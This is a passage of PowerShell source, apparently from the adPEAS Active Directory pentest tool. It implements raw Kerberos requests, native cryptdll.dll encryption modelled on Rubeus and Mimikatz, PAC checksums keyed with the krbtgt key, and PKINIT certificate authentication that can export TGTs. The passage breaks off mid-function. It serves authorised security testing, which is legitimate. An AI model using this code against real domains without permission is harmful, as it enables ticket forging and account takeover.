.DESCRIPTION
    Establishes a TCP connection to a Kerberos KDC (port 88) and sends a
    Kerberos message (AS-REQ or TGS-REQ). The message is prefixed with a
    4-byte big-endian length field as per RFC 4120.

    Used by:
    - Invoke-KerberosAuth.ps1 (AS-REQ/AS-REP)
    - Request-ServiceTicket.ps1 (TGS-REQ/TGS-REP)

.PARAMETER Server
    The KDC server hostname or IP address.

.PARAMETER Request
    The Kerberos request message as byte array.

.PARAMETER Port
    The port to connect to. Default is 88 (standard Kerberos).

.PARAMETER TimeoutMs
    Connection and read/write timeout in milliseconds. Default is 30000 (30 seconds).

.OUTPUTS
    [byte[]] The KDC response message.

.EXAMPLE
    $response = Send-KerberosRequest -Server "dc01.contoso.com" -Request $asReqBytes

.NOTES
    References:
    - RFC 4120 Section 7.2.1: TCP transport for Kerberos
#>
function Send-KerberosRequest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Server,

        [Parameter(Mandatory = $true)]
        [byte[]]$Request,

        [Parameter(Mandatory = $false)]
        [int]$Port = 88,

        [Parameter(Mandatory = $false)]
        [int]$TimeoutMs = 30000
    )

    $tcpClient = $null
    $stream = $null

    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.Connect($Server, $Port)
        $stream = $tcpClient.GetStream()
        $stream.ReadTimeout = $TimeoutMs
        $stream.WriteTimeout = $TimeoutMs

        # Send length prefix (4 bytes, big-endian) followed by request
        $lengthBytes = [System.BitConverter]::GetBytes([uint32]$Request.Length)
        [Array]::Reverse($lengthBytes)
        $stream.Write($lengthBytes, 0, 4)
        $stream.Write($Request, 0, $Request.Length)
        $stream.Flush()

        # Read response length (4 bytes, big-endian)
        # Must handle partial reads - Read() may return fewer bytes than requested
        $responseLengthBytes = New-Object byte[] 4
        $totalLengthRead = 0
        while ($totalLengthRead -lt 4) {
            $lengthBytesRead = $stream.Read($responseLengthBytes, $totalLengthRead, 4 - $totalLengthRead)
            if ($lengthBytesRead -eq 0) {
                throw "Connection closed while reading response length (got $totalLengthRead of 4 bytes)"
            }
            $totalLengthRead += $lengthBytesRead
        }
        [Array]::Reverse($responseLengthBytes)
        $responseLength = [System.BitConverter]::ToUInt32($responseLengthBytes, 0)

        # Read response data
        $responseBytes = New-Object byte[] $responseLength
        $bytesRead = 0
        while ($bytesRead -lt $responseLength) {
            $chunkRead = $stream.Read($responseBytes, $bytesRead, $responseLength - $bytesRead)
            if ($chunkRead -eq 0) {
                throw "Connection closed while reading response data (got $bytesRead of $responseLength bytes)"
            }
            $bytesRead += $chunkRead
        }

        return $responseBytes
    }
    finally {
        if ($stream) { $stream.Close() }
        if ($tcpClient) { $tcpClient.Close() }
    }
}

#region Windows Native Kerberos Crypto (cryptdll.dll)

# P/Invoke definitions for Windows Kerberos crypto API
# This uses the same CDLocateCSystem approach as Rubeus/Mimikatz
# to leverage the Windows-native AES-CTS and RC4-HMAC implementations.
$Script:KerbCryptoTypeAdded = $false
$Script:KerbCryptoHasChecksum = $false

function Initialize-KerbCryptoInterop {
    <#
    .SYNOPSIS
        Initializes P/Invoke types for Windows Kerberos crypto API.
    .DESCRIPTION
        Adds the C# interop types for calling CDLocateCSystem and CDLocateCheckSum from cryptdll.dll.
        This is the same API used by Rubeus and Mimikatz for Kerberos encryption/checksums.
    #>
    if ($Script:KerbCryptoTypeAdded) {
        # Check if checksum types also exist (they may not if loaded from older version)
        if (-not $Script:KerbCryptoHasChecksum) {
            try {
                $null = [adPEAS.KERB_CHECKSUM_ALGORITHM]
                $Script:KerbCryptoHasChecksum = $true
            }
            catch {
                # Checksum types not available in this session
                # A fresh PowerShell session is required after module update
                $Script:KerbCryptoHasChecksum = $false
            }
        }
        return $true
    }

    try {
        # Check if type already exists (from previous import)
        $null = [adPEAS.KerbCrypto]
        $Script:KerbCryptoTypeAdded = $true
        # Also check for checksum types
        try {
            $null = [adPEAS.KERB_CHECKSUM_ALGORITHM]
            $Script:KerbCryptoHasChecksum = $true
        }
        catch {
            $Script:KerbCryptoHasChecksum = $false
        }
        return $true
    }
    catch {
        # Type not loaded yet, add it
    }

    try {
        Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

namespace adPEAS
{
    public enum KERB_ETYPE : int
    {
        aes128_cts_hmac_sha1 = 17,
        aes256_cts_hmac_sha1 = 18,
        rc4_hmac = 23
    }

    // Kerberos checksum types (MS-PAC, RFC 3961)
    // Note: HMAC_MD5 uses negative value per MS-KILE
    public enum KERB_CHECKSUM_ALGORITHM : int
    {
        HMAC_SHA1_96_AES128 = 15,  // AES128 checksum (12 bytes output)
        HMAC_SHA1_96_AES256 = 16,  // AES256 checksum (12 bytes output)
        HMAC_MD5 = -138            // RC4-HMAC checksum (16 bytes output)
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_ECRYPT
    {
        int Type0;
        public int BlockSize;
        int Type1;
        public int KeySize;
        public int Size;
        int unk2;
        int unk3;
        public IntPtr AlgName;
        public IntPtr Initialize;
        public IntPtr Encrypt;
        public IntPtr Decrypt;
        public IntPtr Finish;
        public IntPtr HashPassword;
        IntPtr RandomKey;
        IntPtr Control;
        IntPtr unk0_null;
        IntPtr unk1_null;
        IntPtr unk2_null;
    }

    // Structure for checksum functions (KERB_CHECKSUM)
    // Layout from Windows SDK / Rubeus implementation
    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_CHECKSUM
    {
        public int Type;
        public int Size;               // Checksum output size
        public int Flag;
        public IntPtr Initialize;      // void Initialize(void* pContext)
        public IntPtr Sum;             // void Sum(void* pContext, int cbData, byte* pbData)
        public IntPtr Finalize;        // void Finalize(void* pContext, byte* pbChecksum)
        public IntPtr Finish;          // void Finish(void* pContext)
        public IntPtr InitializeEx;    // int InitializeEx(byte* key, int keyLen, int keyUsage, out void* pContext)
        public IntPtr InitializeEx2;   // Extended init (not used)
    }

    public class KerbCrypto
    {
        [DllImport("cryptdll.dll", CharSet = CharSet.Auto, SetLastError = false)]
        public static extern int CDLocateCSystem(KERB_ETYPE type, out IntPtr pCSystem);

        [DllImport("cryptdll.dll", CharSet = CharSet.Auto, SetLastError = false)]
        public static extern int CDLocateCheckSum(KERB_CHECKSUM_ALGORITHM type, out IntPtr pCheckSum);

        // Delegate types for function pointers in KERB_ECRYPT (encryption)
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int InitializeDelegate(byte[] Key, int KeySize, int KeyUsage, out IntPtr pContext);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int EncryptDelegate(IntPtr pContext, byte[] data, int dataSize, byte[] output, ref int outputSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int DecryptDelegate(IntPtr pContext, byte[] data, int dataSize, byte[] output, ref int outputSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int FinishDelegate(ref IntPtr pContext);

        // Delegate types for function pointers in KERB_CHECKSUM (checksums)
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int ChecksumInitializeExDelegate(byte[] Key, int KeySize, int KeyUsage, out IntPtr pContext);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int ChecksumSumDelegate(IntPtr pContext, int dataSize, byte[] data);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int ChecksumFinalizeDelegate(IntPtr pContext, byte[] checksum);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int ChecksumFinishDelegate(ref IntPtr pContext);

        /// <summary>
        /// Encrypts data using the Windows Kerberos crypto provider.
        /// </summary>
        public static byte[] KerberosEncrypt(KERB_ETYPE eType, int keyUsage, byte[] key, byte[] data)
        {
            IntPtr pCSystemPtr;
            int status = CDLocateCSystem(eType, out pCSystemPtr);
            if (status != 0)
                throw new Exception("CDLocateCSystem failed with status: 0x" + status.ToString("X8"));

            KERB_ECRYPT pCSystem = (KERB_ECRYPT)Marshal.PtrToStructure(pCSystemPtr, typeof(KERB_ECRYPT));

            InitializeDelegate pInit = (InitializeDelegate)Marshal.GetDelegateForFunctionPointer(
                pCSystem.Initialize, typeof(InitializeDelegate));
            EncryptDelegate pEncrypt = (EncryptDelegate)Marshal.GetDelegateForFunctionPointer(
                pCSystem.Encrypt, typeof(EncryptDelegate));
            FinishDelegate pFinish = (FinishDelegate)Marshal.GetDelegateForFunctionPointer(
                pCSystem.Finish, typeof(FinishDelegate));

            IntPtr pContext;
            status = pInit(key, key.Length, keyUsage, out pContext);
            if (status != 0)
                throw new Exception("Kerberos crypto Initialize failed with status: 0x" + status.ToString("X8"));

            try
            {
                int outputSize = data.Length;
                if (data.Length % pCSystem.BlockSize != 0)
                    outputSize += pCSystem.BlockSize - (data.Length % pCSystem.BlockSize);
                outputSize += pCSystem.Size;

                byte[] output = new byte[outputSize];
                status = pEncrypt(pContext, data, data.Length, output, ref outputSize);
                if (status != 0)
                    throw new Exception("Kerberos crypto Encrypt failed with status: 0x" + status.ToString("X8"));

                // Trim to actual output size
                if (outputSize != output.Length)
                {
                    byte[] trimmed = new byte[outputSize];
                    Array.Copy(output, trimmed, outputSize);
                    return trimmed;
                }
                return output;
            }
            finally
            {
                pFinish(ref pContext);
            }
        }

        /// <summary>
        /// Decrypts data using the Windows Kerberos crypto provider.
        /// </summary>
        public static byte[] KerberosDecrypt(KERB_ETYPE eType, int keyUsage, byte[] key, byte[] data)
        {
            IntPtr pCSystemPtr;
            int status = CDLocateCSystem(eType, out pCSystemPtr);
            if (status != 0)
                throw new Exception("CDLocateCSystem failed with status: 0x" + status.ToString("X8"));

            KERB_ECRYPT pCSystem = (KERB_ECRYPT)Marshal.PtrToStructure(pCSystemPtr, typeof(KERB_ECRYPT));

            InitializeDelegate pInit = (InitializeDelegate)Marshal.GetDelegateForFunctionPointer(
                pCSystem.Initialize, typeof(InitializeDelegate));
            DecryptDelegate pDecrypt = (DecryptDelegate)Marshal.GetDelegateForFunctionPointer(
                pCSystem.Decrypt, typeof(DecryptDelegate));
            FinishDelegate pFinish = (FinishDelegate)Marshal.GetDelegateForFunctionPointer(
                pCSystem.Finish, typeof(FinishDelegate));

            IntPtr pContext;
            status = pInit(key, key.Length, keyUsage, out pContext);
            if (status != 0)
                throw new Exception("Kerberos crypto Initialize failed with status: 0x" + status.ToString("X8"));

            try
            {
                int outputSize = data.Length;
                if (data.Length % pCSystem.BlockSize != 0)
                    outputSize += pCSystem.BlockSize - (data.Length % pCSystem.BlockSize);
                outputSize += pCSystem.Size;

                byte[] output = new byte[outputSize];
                status = pDecrypt(pContext, data, data.Length, output, ref outputSize);
                if (status != 0)
                    throw new Exception("Kerberos crypto Decrypt failed with status: 0x" + status.ToString("X8"));

                // Trim to actual output size
                if (outputSize != output.Length)
                {
                    byte[] trimmed = new byte[outputSize];
                    Array.Copy(output, trimmed, outputSize);
                    return trimmed;
                }
                return output;
            }
            finally
            {
                pFinish(ref pContext);
            }
        }

        /// <summary>
        /// Computes a Kerberos checksum using the Windows crypto provider (cryptdll.dll).
        /// This is the same approach used by Rubeus for PAC signatures.
        /// </summary>
        /// <param name="checksumType">The checksum algorithm (15=AES128, 16=AES256, -138=HMAC_MD5)</param>
        /// <param name="keyUsage">The Kerberos key usage number (17 for PAC checksums)</param>
        /// <param name="key">The key bytes</param>
        /// <param name="data">The data to checksum</param>
        /// <returns>The checksum bytes (12 bytes for AES, 16 bytes for RC4)</returns>
        public static byte[] KerberosChecksum(KERB_CHECKSUM_ALGORITHM checksumType, int keyUsage, byte[] key, byte[] data)
        {
            IntPtr pCheckSumPtr;
            int status = CDLocateCheckSum(checksumType, out pCheckSumPtr);
            if (status != 0)
                throw new Exception("CDLocateCheckSum failed with status: 0x" + status.ToString("X8"));

            KERB_CHECKSUM pCheckSum = (KERB_CHECKSUM)Marshal.PtrToStructure(pCheckSumPtr, typeof(KERB_CHECKSUM));

            ChecksumInitializeExDelegate pInitEx = (ChecksumInitializeExDelegate)Marshal.GetDelegateForFunctionPointer(
                pCheckSum.InitializeEx, typeof(ChecksumInitializeExDelegate));
            ChecksumSumDelegate pSum = (ChecksumSumDelegate)Marshal.GetDelegateForFunctionPointer(
                pCheckSum.Sum, typeof(ChecksumSumDelegate));
            ChecksumFinalizeDelegate pFinalize = (ChecksumFinalizeDelegate)Marshal.GetDelegateForFunctionPointer(
                pCheckSum.Finalize, typeof(ChecksumFinalizeDelegate));
            ChecksumFinishDelegate pFinish = (ChecksumFinishDelegate)Marshal.GetDelegateForFunctionPointer(
                pCheckSum.Finish, typeof(ChecksumFinishDelegate));

            IntPtr pContext;
            status = pInitEx(key, key.Length, keyUsage, out pContext);
            if (status != 0)
                throw new Exception("Checksum InitializeEx failed with status: 0x" + status.ToString("X8"));

            try
            {
                status = pSum(pContext, data.Length, data);
                if (status != 0)
                    throw new Exception("Checksum Sum failed with status: 0x" + status.ToString("X8"));

                byte[] checksum = new byte[pCheckSum.Size];
                status = pFinalize(pContext, checksum);
                if (status != 0)
                    throw new Exception("Checksum Finalize failed with status: 0x" + status.ToString("X8"));

                return checksum;
            }
            finally
            {
                pFinish(ref pContext);
            }
        }
    }
}
'@ -ErrorAction Stop

        $Script:KerbCryptoTypeAdded = $true
        $Script:KerbCryptoHasChecksum = $true  # Fresh compile includes checksum types
        return $true
    }
    catch {
        Write-Verbose "[Initialize-KerbCryptoInterop] Failed to add P/Invoke types: $_"
        return $false
    }
}

function Protect-KerberosNative {
    <#
    .SYNOPSIS
        Encrypts data using Windows native Kerberos crypto (cryptdll.dll).
    .DESCRIPTION
        Uses the same CDLocateCSystem API as Rubeus/Mimikatz for guaranteed
        compatibility with the KDC's encryption implementation.
        Falls back to the pure PowerShell implementation if P/Invoke fails.
    .PARAMETER Key
        The encryption key bytes.
    .PARAMETER Data
        The plaintext data to encrypt.
    .PARAMETER KeyUsage
        The Kerberos key usage number (e.g., 2 for ticket encryption).
    .PARAMETER EncryptionType
        The Kerberos encryption type (17=AES128, 18=AES256, 23=RC4).
    .OUTPUTS
        [byte[]] Encrypted data (confounder + ciphertext + checksum).
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Key,

        [Parameter(Mandatory=$true)]
        [byte[]]$Data,

        [Parameter(Mandatory=$true)]
        [int]$KeyUsage,

        [Parameter(Mandatory=$true)]
        [int]$EncryptionType
    )

    # Try native Windows crypto first
    if (Initialize-KerbCryptoInterop) {
        try {
            $eType = [adPEAS.KERB_ETYPE]$EncryptionType
            $result = [adPEAS.KerbCrypto]::KerberosEncrypt($eType, $KeyUsage, $Key, $Data)
            Write-Verbose "[Protect-KerberosNative] Native encryption successful: input=$($Data.Length) output=$($result.Length)"
            return $result
        }
        catch {
            Write-Verbose "[Protect-KerberosNative] Native encryption failed, falling back to PowerShell: $_"
        }
    }

    # Fallback to pure PowerShell implementation
    Write-Verbose "[Protect-KerberosNative] Using PowerShell fallback for etype $EncryptionType"
    switch ($EncryptionType) {
        23 { return Encrypt-RC4HMAC -Key $Key -Data $Data -KeyUsage $KeyUsage }
        17 { return Encrypt-AESCTS -Key $Key -Data $Data -KeyUsage $KeyUsage }
        18 { return Encrypt-AESCTS -Key $Key -Data $Data -KeyUsage $KeyUsage }
        default { throw "Unsupported encryption type: $EncryptionType" }
    }
}

function Unprotect-KerberosNative {
    <#
    .SYNOPSIS
        Decrypts data using Windows native Kerberos crypto (cryptdll.dll).
    .DESCRIPTION
        Uses the same CDLocateCSystem API as Rubeus/Mimikatz for guaranteed
        compatibility with the KDC's decryption implementation.
        Falls back to the pure PowerShell implementation if P/Invoke fails.
    .PARAMETER Key
        The decryption key bytes.
    .PARAMETER CipherText
        The encrypted data (confounder + ciphertext + checksum).
    .PARAMETER KeyUsage
        The Kerberos key usage number (e.g., 2 for ticket encryption).
    .PARAMETER EncryptionType
        The Kerberos encryption type (17=AES128, 18=AES256, 23=RC4).
    .OUTPUTS
        [byte[]] Decrypted plaintext.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Key,

        [Parameter(Mandatory=$true)]
        [byte[]]$CipherText,

        [Parameter(Mandatory=$true)]
        [int]$KeyUsage,

        [Parameter(Mandatory=$true)]
        [int]$EncryptionType
    )

    # Try native Windows crypto first
    if (Initialize-KerbCryptoInterop) {
        try {
            $eType = [adPEAS.KERB_ETYPE]$EncryptionType
            $result = [adPEAS.KerbCrypto]::KerberosDecrypt($eType, $KeyUsage, $Key, $CipherText)
            Write-Verbose "[Unprotect-KerberosNative] Native decryption successful: input=$($CipherText.Length) output=$($result.Length)"
            return $result
        }
        catch {
            Write-Verbose "[Unprotect-KerberosNative] Native decryption failed, falling back to PowerShell: $_"
        }
    }

    # Fallback to pure PowerShell implementation
    Write-Verbose "[Unprotect-KerberosNative] Using PowerShell fallback for etype $EncryptionType"
    switch ($EncryptionType) {
        23 { return Decrypt-RC4HMAC -Key $Key -CipherText $CipherText -KeyUsage $KeyUsage }
        17 { return Decrypt-AESCTS -Key $Key -CipherText $CipherText -KeyUsage $KeyUsage }
        18 { return Decrypt-AESCTS -Key $Key -CipherText $CipherText -KeyUsage $KeyUsage }
        default { throw "Unsupported encryption type: $EncryptionType" }
    }
}

function Get-KerberosChecksumNative {
    <#
    .SYNOPSIS
        Computes a Kerberos checksum using Windows native crypto (cryptdll.dll).
    .DESCRIPTION
        Uses the same CDLocateCheckSum API as Rubeus for guaranteed compatibility
        with the KDC's checksum implementation. This is critical for PAC signatures
        where our pure PowerShell implementation produces different results.

        Falls back to the pure PowerShell implementation if P/Invoke fails.
    .PARAMETER Key
        The key bytes (krbtgt key for PAC signatures).
    .PARAMETER Data
        The data to compute the checksum over.
    .PARAMETER KeyUsage
        The Kerberos key usage number (17 for PAC checksums).
    .PARAMETER EncryptionType
        The Kerberos encryption type (17=AES128, 18=AES256, 23=RC4).
    .OUTPUTS
        [byte[]] The checksum bytes (12 bytes for AES, 16 bytes for RC4).
    .EXAMPLE
        $checksum = Get-KerberosChecksumNative -Key $krbtgtKey -Data $pacData -KeyUsage 17 -EncryptionType 18
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Key,

        [Parameter(Mandatory=$true)]
        [byte[]]$Data,

        [Parameter(Mandatory=$true)]
        [int]$KeyUsage,

        [Parameter(Mandatory=$true)]
        [int]$EncryptionType
    )

    # Map encryption type to checksum type
    # AES256 (etype 18) -> HMAC_SHA1_96_AES256 (checksum type 16)
    # AES128 (etype 17) -> HMAC_SHA1_96_AES128 (checksum type 15)
    # RC4 (etype 23) -> HMAC_MD5 (checksum type -138)
    $checksumType = switch ($EncryptionType) {
        18 { 16 }    # AES256 -> HMAC_SHA1_96_AES256
        17 { 15 }    # AES128 -> HMAC_SHA1_96_AES128
        23 { -138 }  # RC4 -> HMAC_MD5
        default { throw "Unsupported encryption type for checksum: $EncryptionType" }
    }

    # Try native Windows crypto first (requires checksum types to be loaded)
    Write-Verbose "[Get-KerberosChecksumNative] Called with: etype=$EncryptionType, checksumType=$checksumType, keyUsage=$KeyUsage, keyLen=$($Key.Length), dataLen=$($Data.Length)"
    if ((Initialize-KerbCryptoInterop) -and $Script:KerbCryptoHasChecksum) {
        try {
            $cksumType = [adPEAS.KERB_CHECKSUM_ALGORITHM]$checksumType
            $result = [adPEAS.KerbCrypto]::KerberosChecksum($cksumType, $KeyUsage, $Key, $Data)
            Write-Verbose "[Get-KerberosChecksumNative] Native checksum successful: data=$($Data.Length) checksum=$($result.Length) bytes"
            Write-Verbose "[Get-KerberosChecksumNative] Checksum: $(($result | ForEach-Object { '{0:X2}' -f $_ }) -join '')"
            return $result
        }
        catch {
            Write-Verbose "[Get-KerberosChecksumNative] Native checksum failed, falling back to PowerShell: $_"
        }
    }
    elseif (-not $Script:KerbCryptoHasChecksum) {
        Write-Verbose "[Get-KerberosChecksumNative] Native checksum types not available (requires fresh PowerShell session after module update)"
    }

    # Fallback to pure PowerShell implementation
    Write-Verbose "[Get-KerberosChecksumNative] Using PowerShell fallback for etype $EncryptionType"
    switch ($EncryptionType) {
        23 {
            # RC4-HMAC: HMAC-MD5 with key derived from base key
            # K = HMAC-MD5(key, little-endian keyUsage)
            $usageBytes = [BitConverter]::GetBytes([int32]$KeyUsage)
            $derivedKey = Get-HMACMD5 -Key $Key -Data $usageBytes
            return Get-HMACMD5 -Key $derivedKey -Data $Data
        }
        { $_ -in @(17, 18) } {
            # AES: HMAC-SHA1 with Kc (checksum key) derived from base key, truncated to 12 bytes
            $kcConstant = Get-KeyUsageConstant -KeyUsage $KeyUsage -Suffix $Script:KC_CONSTANT_SUFFIX
            $checksumKey = Get-AESDerivedKey -BaseKey $Key -Constant $kcConstant -KeyLength $Key.Length
            $fullHmac = Get-HMACSHA1 -Key $checksumKey -Data $Data
            return $fullHmac[0..11]  # Truncate to 12 bytes
        }
        default { throw "Unsupported encryption type: $EncryptionType" }
    }
}

#endregion


# ----- Invoke-PKINITAuth-Native.ps1 -----

<#
.SYNOPSIS
    Native PowerShell PKINIT authentication using raw Kerberos protocol.

.DESCRIPTION
    This function performs PKINIT (Public Key Cryptography for Initial Authentication in Kerberos) using a pure PowerShell implementation of the Kerberos protocol. No external tools required.

    Features:
    - Pure PowerShell implementation (no Rubeus, no Python tools)
    - Diffie-Hellman key exchange for session key derivation
    - CMS/PKCS#7 signed AuthPack
    - TGT extraction and optional cache import

.PARAMETER Certificate
    Certificate for authentication. Accepts:
    - X509Certificate2 object (already loaded certificate)
    - Path to a PFX/P12 certificate file
    - Base64-encoded PFX data
    The function auto-detects the input type.

.PARAMETER CertificatePassword
    Password for the PFX/P12 certificate file (if using file path or Base64).

.PARAMETER Domain
    Target domain for authentication. If not specified, uses current domain.

.PARAMETER DomainController
    Specific domain controller to target. If not specified, uses auto-discovery.

.PARAMETER UserName
    Username to authenticate as. If not specified, derived from certificate.

.PARAMETER OutputKirbi
    Optional path to save the TGT as a .kirbi file.

.PARAMETER NoPAC
    Request TGT without PAC (Privilege Attribute Certificate).

.EXAMPLE
    Invoke-PKINITAuth-Native -Certificate "C:\cert\user.pfx" -CertificatePassword "P@ssw0rd!"
    Performs PKINIT authentication using a certificate file.

.EXAMPLE
    Invoke-PKINITAuth-Native -Certificate $x509Cert
    Performs PKINIT authentication using an already-loaded X509Certificate2 object.

.EXAMPLE
    Invoke-PKINITAuth-Native -Certificate "MIIKwgYJKoZI..." -CertificatePassword "pass"
    Performs PKINIT authentication using Base64-encoded PFX data.

.EXAMPLE
    Invoke-PKINITAuth-Native -Certificate "C:\cert\admin.pfx" -CertificatePassword "pass" -OutputKirbi "C:\tickets\admin.kirbi"
    Performs PKINIT and saves the TGT to a kirbi file for later use.

.OUTPUTS
    PSCustomObject with authentication result including TGT and session key.

.NOTES
    Author: Alexander Sturz (@_61106960_)
    References:
    - https://github.com/dirkjanm/PKINITtools (Python reference implementation)
    - https://github.com/skelsec/minikerberos (Python Kerberos library)
#>

function Invoke-PKINITAuth-Native {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, Position=0)]
        $Certificate,  # Accepts X509Certificate2, file path, or Base64

        [Parameter(Mandatory=$false, Position=1)]
        [string]$CertificatePassword = "",

        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$DomainController,

        [Parameter(Mandatory=$false)]
        [string]$UserName,

        [Parameter(Mandatory=$false)]
        [string]$OutputKirbi,

        [Parameter(Mandatory=$false)]
        [switch]$NoPAC
    )

    begin {
        Write-Log "[Invoke-PKINITAuth-Native] Starting native PKINIT authentication..."

        # Track if we created the certificate (so we know whether to dispose it)
        $CertCreatedByUs = $false

        # Load certificate based on input type
        try {
            if ($Certificate -is [System.Security.Cryptography.X509Certificates.X509Certificate2]) {
                # Already an X509Certificate2 object - don't dispose it, caller owns it
                $Cert = $Certificate
                $CertCreatedByUs = $false
                Write-Log "[Invoke-PKINITAuth-Native] Using provided X509Certificate2 object"
            }
            elseif ($Certificate -is [string]) {
                # String input - could be file path or Base64
                $certResult = ConvertFrom-Base64OrFile -InputValue $Certificate -ExpectedFormat "Certificate" -ParameterName "Certificate"

                if (-not $certResult.Success) {
                    throw $certResult.Error
                }

                Write-Log "[Invoke-PKINITAuth-Native] Certificate loaded from $($certResult.Source): $($certResult.Data.Length) bytes"

                # Load the certificate from bytes - we created it, so we must dispose it
                $Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(
                    $certResult.Data,
                    $CertificatePassword,
                    [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable
                )
                $CertCreatedByUs = $true
            }
            else {
                throw "Invalid Certificate parameter type. Expected X509Certificate2, file path, or Base64 string."
            }

            Write-Log "[Invoke-PKINITAuth-Native] Certificate loaded: $($Cert.Subject)"

            # Show certificate EKUs for diagnostics (using central OID mapping from adPEAS-OIDs.ps1)
            $ekuExt = $Cert.Extensions | Where-Object { $_.Oid.Value -eq "2.5.29.37" }
            if ($ekuExt) {
                try {
                    # Use X509EnhancedKeyUsageExtension for proper OID extraction
                    if ($ekuExt -is [System.Security.Cryptography.X509Certificates.X509EnhancedKeyUsageExtension]) {
                        $ekuOids = @()
                        foreach ($eku in $ekuExt.EnhancedKeyUsages) {
                            $ekuOids += $eku.Value
                        }
                        # Convert OIDs to names using central mapping
                        $ekuNames = Convert-OIDsToNames -OIDs $ekuOids
                        Write-Log "[Invoke-PKINITAuth-Native] Certificate EKUs: $($ekuNames -join ', ')"

                        # Check for PKINIT-capable EKUs using central function
                        $hasPKINITEku = Test-CertificatePKINITCapable -EKUOIDs $ekuOids
                        if (-not $hasPKINITEku) {
                            Write-Log "[Invoke-PKINITAuth-Native] WARNING: Certificate may not have PKINIT-capable EKU!"
                        }
                    }
                    else {
                        # Fallback: Parse formatted string output
                        $ekuOids = $ekuExt.Format($false) -split ', '
                        $ekuNames = Convert-OIDsToNames -OIDs $ekuOids
                        Write-Log "[Invoke-PKINITAuth-Native] Certificate EKUs: $($ekuNames -join ', ')"
                    }
                } catch {
                    Write-Log "[Invoke-PKINITAuth-Native] Could not parse EKUs: $_"
                }
            } else {
                Write-Log "[Invoke-PKINITAuth-Native] No Extended Key Usage extension found in certificate"
            }

            if (-not $Cert.HasPrivateKey) {
                throw "Certificate does not have a private key"
            }
        } catch {
            throw "Failed to load certificate: $_"
        }

        # Determine domain if not specified
        if (-not $Domain) {
            try {
                $CurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
                $Domain = $CurrentDomain.Name
                Write-Log "[Invoke-PKINITAuth-Native] Auto-detected domain: $Domain"
            } catch {
                throw "Could not detect domain. Please specify -Domain parameter."
            }
        }

        # Resolve Domain Controller using unified resolver
        # If -DomainController is explicit, just resolve that hostname to IP (skip DC discovery)
        # If -DomainController is not set, use domain-based DC discovery via SRV records
        if ($DomainController) {
            $ResolvedIP = Resolve-adPEASName -Name $DomainController
            $DCResolution = [PSCustomObject]@{ Hostname = $DomainController; IP = $ResolvedIP }
        } else {
            $DCResolution = Resolve-adPEASName -Domain $Domain
        }
        Write-Log "[Invoke-PKINITAuth-Native] DC Resolution: Hostname=$($DCResolution.Hostname), IP=$($DCResolution.IP)"

        # Use resolved IP for KDC connection if available (required for custom DNS scenarios)
        # Otherwise fall back to hostname/domain
        if ($DCResolution.IP) {
            $DomainController = $DCResolution.IP
            Write-Log "[Invoke-PKINITAuth-Native] Using resolved IP for KDC: $DomainController"
        }
        elseif ($DCResolution.Hostname) {
            $DomainController = $DCResolution.Hostname
            Write-Log "[Invoke-PKINITAuth-Native] Using resolved hostname for KDC: $DomainController"
        }
        else {
            # Fallback to domain name
            $DomainController = $Domain
            Write-Log "[Invoke-PKINITAuth-Native] Fallback: Using domain name for KDC: $DomainController"
        }

        # Determine username if not specified
        if (-not $UserName) {
            # Try to extract from certificate SAN or Subject
            $UserName = $null

            # Check Subject Alternative Name for UPN
            foreach ($ext in $Cert.Extensions) {
                if ($ext.Oid.Value -eq "2.5.29.17") {  # SAN OID
                    # Try to find UPN in raw data
                    $sanData = $ext.Format($false)
                    if ($sanData -match 'Principal Name=([^,\r\n]+)') {
                        $UserName = $Matches[1]
                        break
                    }
                }
            }

            if (-not $UserName) {
                # Fall back to CN from Subject
                $SubjectCN = ($Cert.Subject -split ',')[0] -replace 'CN=', ''
                $UserName = $SubjectCN.TrimEnd('$')
            }

            Write-Log "[Invoke-PKINITAuth-Native] Using username: $UserName"
        }

        # Diffie-Hellman Parameters (RFC 2409 MODP Group 2 - 1024 bit)
        # These are the "well-known" DH parameters used by Windows PKINIT
        # Note: Using local scope (not Script:) since these are only used within this function
        $DH_P_HEX = @"
FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE65381FFFFFFFFFFFFFFFF
"@.Trim()
        $DH_G = 2

        # Kerberos Encryption Types (RFC 3961, RFC 3962, RFC 4757)
        $ETYPE_AES128_CTS = 17
        $ETYPE_AES256_CTS = 18
        $ETYPE_RC4_HMAC = 23

        # Convert hex string to BigInteger
        $DH_P = [System.Numerics.BigInteger]::Parse(
            "00" + $DH_P_HEX,
            [System.Globalization.NumberStyles]::HexNumber
        )
        function Get-RandomBigInteger {
            param([int]$BitLength)

            $byteLength = [math]::Ceiling($BitLength / 8)
            $bytes = New-Object byte[] $byteLength

            $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
            $rng.GetBytes($bytes)
            $rng.Dispose()

            # Ensure positive by setting high bit to 0
